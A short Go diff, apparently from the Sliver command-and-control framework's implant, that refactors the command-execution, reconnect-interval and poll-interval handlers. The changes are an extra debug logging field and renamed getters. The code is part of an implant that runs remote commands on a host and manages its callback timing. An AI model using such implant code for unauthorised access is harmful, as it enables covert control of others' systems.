@@ -424,7 +424,7 @@ func executeHandler(data []byte, resp RPCResponse) {
 		cmd.Stderr = stdErr
 		err := cmd.Run()
 		//{{if .Config.Debug}}
-		log.Println(string(stdOutBuff.String()))
+		log.Printf("Exec (%v): %s", err, string(stdOutBuff.String()))
 		//{{end}}
 		if err != nil {
 			// Exit errors are not a failure of the RPC, but of the command.
@@ -544,13 +544,13 @@ func reconnectIntervalHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	reconnectInterval := reconnectIntervalReq.GetReconnectIntervalSeconds()
+	reconnectInterval := reconnectIntervalReq.GetReconnectInterval()
 	// {{if .Config.Debug}}
 	log.Printf("Update reconnect interval called: %d\n", reconnectInterval)
 	// {{end}}
 
 	// Set the reconnect interval value
-	transports.SetReconnectInterval(int(reconnectInterval))
+	transports.SetReconnectInterval(reconnectInterval)
 
 	recIntervalResp := &sliverpb.ReconnectInterval{}
 	recIntervalResp.Response = &commonpb.Response{}
@@ -572,13 +572,13 @@ func pollIntervalHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	pollInterval := pollIntervalReq.GetPollIntervalSeconds()
+	pollInterval := pollIntervalReq.GetPollInterval()
 	// {{if .Config.Debug}}
 	log.Printf("Update poll interval called: %d\n", pollInterval)
 	// {{end}}
 
 	// Set the reconnect interval value
-	transports.SetPollInterval(int(pollInterval))
+	transports.SetPollTimeout(pollInterval)
 
 	pollIntervalResp := &sliverpb.PollInterval{}
 	pollIntervalResp.Response = &commonpb.Response{}
